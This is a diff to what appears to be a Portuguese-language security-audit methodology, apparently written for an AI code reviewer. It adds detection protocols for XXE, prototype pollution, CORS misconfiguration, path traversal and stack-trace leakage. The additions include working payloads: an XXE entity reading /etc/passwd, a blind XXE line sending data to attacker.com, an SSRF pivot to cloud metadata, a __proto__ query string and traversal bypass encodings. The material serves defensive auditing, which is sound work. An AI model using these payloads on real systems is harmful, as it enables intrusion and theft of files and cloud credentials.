@@ -92,6 +92,51 @@
       - `PyYAML < 6.0` → `yaml.load()` sem Loader = RCE
     - Qualquer versão encontrada abaixo desses thresholds deve ser reportada como **Crítico** imediato.
 
+15. **XML External Entity (XXE):** *(Adicionado - automelhorar v1.5)*
+    - Ocorre quando um parser XML aceita e processa entidades externas definidas pelo atacante no documento XML submetido.
+    - **Payload básico de exfiltração:**
+      ```xml
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <root><data>&xxe;</data></root>
+      ```
+    - **XXE cego (via OOB):** `<!ENTITY xxe SYSTEM "http://attacker.com/?data=SECRET">` — o dado vaza via requisição HTTP externa.
+    - **XXE → SSRF:** `SYSTEM "http://169.254.169.254/latest/meta-data/"` pivota para metadata de cloud.
+    - **Protocolo de detecção estática:** `grep_search` por `DocumentBuilderFactory`, `SAXParserFactory`, `XMLReader`, `simplexml_load_string`, `lxml.etree.parse`, `XmlDocument`. Verificar se `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` está presente. Ausência = vulnerabilidade crítica.
+    - **Content-Type Switching:** Apps REST que aceitam `application/json` e `application/xml` podem expor um parser XML não configurado ao trocar o header. Identificar endpoints genéricos que retornam o dado reformatado.
+
+16. **Prototype Pollution (Protocolo Completo):** *(Adicionado - automelhorar v1.5)*
+    - Em JavaScript/Node.js, se um atacante controla a chave de um objeto e consegue inserir `__proto__` ou `constructor.prototype`, todos os objetos do processo herdam a propriedade poluída.
+    - **Vetores de entrada:** parâmetros de query string (`?__proto__[isAdmin]=true`), JSON bodies profundos, funções de merge/clone recursivo não seguras.
+    - **Impactos possíveis:**
+      - Auth bypass: `Object.prototype.isAdmin = true` herdado por todas as verificações de permissão.
+      - RCE via template engines: Handlebars, Pug, EJS aceitam propriedades de proto como contexto de render.
+      - DoS: poluir `Object.prototype.toString` quebra operações nativas.
+    - **`grep_search` crítico:** funções próprias de merge recursivo (`deepMerge`, `extend`, `_.merge`), ausência de `Object.create(null)` em stores de cache, uso de `JSON.parse` com resultado diretamente aplicado a objetos via spread.
+    - **Teste estático:** localizar qualquer função que itera chaves de objeto e as atribui dinamicamente sem sanitizar `__proto__` e `constructor`.
+
+17. **CORS Misconfiguration:** *(Adicionado - automelhorar v1.5)*
+    - Quando `Access-Control-Allow-Origin` reflete o valor do header `Origin:` da requisição de forma dinâmica **e** `Access-Control-Allow-Credentials: true` está presente, o atacante pode ler responses autenticadas de qualquer domínio.
+    - **Protocolo de detecção estática:**
+      - `grep_search` por: `Access-Control-Allow-Origin`, `cors(`, `origin:`, `setHeader.*Access-Control`.
+      - Verificar se o valor é hardcoded (`*`) ou dinâmico (reflete `req.headers.origin`).
+      - Padrão crítico: `res.setHeader('Access-Control-Allow-Origin', req.headers.origin)` + `credentials: true` = comprometimento total de sessões cross-domain.
+    - **Variantes:**
+      - `null` origin aceito: `Access-Control-Allow-Origin: null` permite request de iframes sandboxed.
+      - Whitelist com validação de sufixo falha: `trusted.com.attacker.com` passa se o código usa `endsWith('trusted.com')`.
+
+18. **Path Traversal em File Serving:** *(Adicionado - automelhorar v1.5)*
+    - Diferente de LFI (que usa `include()` do PHP), path traversal ocorre em endpoints de *download, preview, thumbnail, export* que concatenam input do usuário com um `basePath` para construir o caminho do arquivo.
+    - **`grep_search` por:** `path.join(basePath, userInput)`, `readFile(dir + req.params`, `sendFile(`, `FileInputStream(base +`, `file_get_contents(dir.`
+    - **Protocolo:** verificar se o caminho final é validado contra o `basePath` após resolução (ex: `realpath()` + verificação de prefixo). Sem isso, `../../../etc/passwd` atravessa diretórios.
+    - **Variantes de bypass de filtro:** `..%2F`, `..%252F` (double-encode), `....//`, `..\` (Windows), sobrepostos com normalização de URL.
+    - **Severidade:** leitura de código-fonte da aplicação, chaves privadas, arquivos `.env`, senhas hardcoded — escala imediatamente para **Crítico**.
+
+19. **Vazamento de Informação em Stack Traces e Códigos de Erro:** *(Adicionado - automelhorar v1.5)*
+    - Frequentemente classificado como "Info" e ignorado. Na prática, expor stack traces com nomes de arquivos internos, versões de frameworks, queries SQL mal-formadas ou estrutura de métodos priva o atacante de não precisar fazer reconhecimento: a própria aplicação entrega o mapa.
+    - **`grep_search` por:** `debug=True` (Django/Flask), `app.set('env', 'development')` (Express), `display_errors = On` (PHP), ausência de handlers de erro genéricos (`app.use((err, req, res, next)`), `e.printStackTrace()` sem captura.
+    - **Regra de chain exploit:** Stack trace com query SQL + SQLi = atacante constrói payload preciso sem tentativa e erro. Reclassificar para **Alto**.
+
 ---
 
 ## Protocolo de Investigação Exploratória (PEI)
@@ -99,6 +144,7 @@
 ### Fase 0 — Avaliação de Stack e Heurística Probabilística
 - Identificar: linguagem, framework, bibliotecas (`composer.json`, `package.json`, `requirements.txt`, `pom.xml`, `web.config`).
 - Construir mentalmente o **Mapa de Probabilidades**: listar as 3 classes de vulnerabilidade mais prováveis dado o stack, na ordem de ataque.
+- **Sinais de alta probabilidade adicionais:** qualquer endpoint com parâmetro de filename/path → Path Traversal prioritário. Qualquer configuração CORS dinâmica → verificar imediatamente. Qualquer parsing de XML em app REST → XXE.
 
 ### Fase 0.5 — Análise de Dependências por CVE *(Adicionado - automelhorar v1.4)*
 - Ler os manifestos de dependência e cruzar versões com CVEs críticos conhecidos (ver Pilar 14).
@@ -147,4 +193,5 @@
 | v1.1 | 15/04/2026 | Paradigma Paranoico, Ceticismo Contínuo, Tinta-por-Tinta |
 | v1.2 | 15/04/2026 | Heurística Probabilística por Stack, Psicanálise do Código, Efeito Borboleta, Taint Analysis |
 | v1.3 | 15/04/2026 | Business Logic Flaws, Second-Order Injection, Trust Boundary Violations, Matriz de Severidade com Chain Exploit |
-| v1.4 | 15/04/2026 | **Mass Assignment via ORM, Race Condition/TOCTOU, SSTI por Engine com payloads, JWT Algorithm Confusion completo, Análise de Dependências por CVE** |
+| v1.4 | 15/04/2026 | Mass Assignment via ORM, Race Condition/TOCTOU, SSTI por Engine com payloads, JWT Algorithm Confusion completo, Análise de Dependências por CVE |
+| v1.5 | 15/04/2026 | **XXE com payload e Content-Type switching, Prototype Pollution completo, CORS Misconfiguration com variantes, Path Traversal em file serving, Vazamento de Stack Trace como vetor de chain** |
